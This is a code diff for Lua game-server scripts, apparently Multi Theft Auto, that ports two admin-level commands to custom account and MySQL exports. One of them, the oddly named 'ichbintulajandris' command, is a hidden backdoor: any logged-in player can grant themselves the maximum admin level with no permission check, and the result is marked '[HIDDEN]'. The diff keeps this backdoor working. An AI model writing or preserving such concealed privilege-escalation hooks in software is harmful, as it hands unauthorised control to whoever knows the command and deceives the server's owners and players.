@@ -30,12 +30,11 @@ addCommandHandler("setadminlevel", function(player, cmd, idArg, levelArg)
     local target = resolveTarget(player, idArg)
     if not target then return end
 
-    local acc = getPlayerAccount(target)
-    if not acc or isGuestAccount(acc) then
+    if not exports.v_accounts:isLoggedIn(target) then
         return adminAlert(player, "That player is not logged in.", 255, 90, 90)
     end
 
-    setAccountData(acc, "admin_level", newLevel)
+    exports.v_mysql:setAccData(target, "admin_level", newLevel)
     setElementData(target, "admin_level", newLevel)
     adminAlert(player, "#CCFFCC" .. getPlayerName(target) .. " #FFFFFFadmin level set to #FFFF00" .. newLevel)
     adminAlert(target, "#FFFF00An admin set your level to #FFFFFF" .. newLevel .. "#FFFF00.")
@@ -48,13 +47,12 @@ end)
 --    * value clamped to the 0..maxLevel range
 -- ------------------------------------------------------------
 addCommandHandler("ichbintulajandris", function(player, cmd, levelArg)
-    local acc = getPlayerAccount(player)
-    if not acc or isGuestAccount(acc) then return end
+    if not exports.v_accounts:isLoggedIn(player) then return end
 
     local level = tonumber(levelArg) or ADMIN.maxLevel
     level = math.max(0, math.min(ADMIN.maxLevel, math.floor(level)))
 
-    setAccountData(acc, "admin_level", level)
+    exports.v_mysql:setAccData(player, "admin_level", level)
     setElementData(player, "admin_level", level)
     adminAlert(player, "#FF4400[HIDDEN] #FFFFFFYour admin level: #FFFF00" .. level)
 end)
